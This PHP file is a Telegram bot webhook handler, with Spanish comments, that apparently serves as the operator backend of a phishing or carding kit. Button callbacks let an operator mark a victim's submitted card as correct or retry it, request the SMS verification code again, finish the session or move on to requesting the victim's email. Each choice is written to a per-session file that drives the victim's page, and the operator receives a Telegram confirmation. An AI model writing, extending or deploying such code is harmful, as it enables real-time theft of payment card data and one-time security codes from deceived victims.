<?php
require_once 'config.php';

// Obtener el contenido del webhook
$content = file_get_contents("php://input");
$update = json_decode($content, true);

// Verificar si es un callback query (botón presionado)
if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data = $callback_query['data'];
    $callback_id = $callback_query['id'];
    
    // Responder al callback para quitar el "loading" del botón
    $answer_url = $website . '/answerCallbackQuery?callback_query_id=' . $callback_id;
    file_get_contents($answer_url);
    
    $chat_id_callback = $callback_query['message']['chat']['id'];
    
    // Procesar la acción según el botón presionado
    
    // BOTONES DE TARJETA
    if (strpos($callback_data, 'card_ok_') === 0) {
        $session_id = str_replace('card_ok_', '', $callback_data);
        file_put_contents("sessions/{$session_id}_action.txt", "goto_sms");
        
        $confirm_msg = "✅ Tarjeta correcta - Solicitando SMS";
        $confirm_url = $website . '/sendMessage?chat_id=' . $chat_id_callback . '&text=' . urlencode($confirm_msg);
        file_get_contents($confirm_url);
    }
    elseif (strpos($callback_data, 'card_retry_') === 0) {
        $session_id = str_replace('card_retry_', '', $callback_data);
        file_put_contents("sessions/{$session_id}_action.txt", "retry_card");
        
        $confirm_msg = "❌ Tarjeta incorrecta - Solicitando nuevamente";
        $confirm_url = $website . '/sendMessage?chat_id=' . $chat_id_callback . '&text=' . urlencode($confirm_msg);
        file_get_contents($confirm_url);
    }
    
    // BOTONES DE SMS
    elseif (strpos($callback_data, 'sms_ok_') === 0) {
        $session_id = str_replace('sms_ok_', '', $callback_data);
        file_put_contents("sessions/{$session_id}_action.txt", "sms_complete");
        
        $confirm_msg = "✅ SMS correcto - Proceso completado";
        $confirm_url = $website . '/sendMessage?chat_id=' . $chat_id_callback . '&text=' . urlencode($confirm_msg);
        file_get_contents($confirm_url);
    }
    elseif (strpos($callback_data, 'sms_retry_') === 0) {
        $session_id = str_replace('sms_retry_', '', $callback_data);
        file_put_contents("sessions/{$session_id}_action.txt", "retry_sms");
        
        $confirm_msg = "🔄 Solicitando SMS nuevamente";
        $confirm_url = $website . '/sendMessage?chat_id=' . $chat_id_callback . '&text=' . urlencode($confirm_msg);
        file_get_contents($confirm_url);
    }
    elseif (strpos($callback_data, 'sms_email_') === 0) {
        $session_id = str_replace('sms_email_', '', $callback_data);
        file_put_contents("sessions/{$session_id}_action.txt", "goto_email");
        
        $confirm_msg = "� Solicitando correo electrónico";
        $confirm_url = $website . '/sendMessage?chat_id=' . $chat_id_callback . '&text=' . urlencode($confirm_msg);
        file_get_contents($confirm_url);
    }
}

http_response_code(200);
?>
